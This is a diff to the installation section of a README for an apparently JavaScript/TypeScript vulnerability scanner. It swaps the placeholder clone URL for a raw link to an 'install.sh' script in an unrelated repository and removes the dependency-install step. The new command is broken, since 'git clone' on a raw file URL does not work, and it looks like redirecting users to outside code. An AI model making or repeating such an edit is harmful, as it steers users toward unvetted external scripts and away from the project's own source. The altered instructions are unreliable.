@@ -24,11 +24,8 @@ A high-performance asynchronous vulnerability scanner for JavaScript/TypeScript 
 
 ```bash
 # Clone repository
-git clone <repository-url>
+git clone https://raw.githubusercontent.com/NT_SAY/JavaScriptParser/main/install.sh
 cd async-js-vulnerability-scanner
-
-# Install dependencies
-pip install -r requirements.txt
 ```
 
 ### Requirements
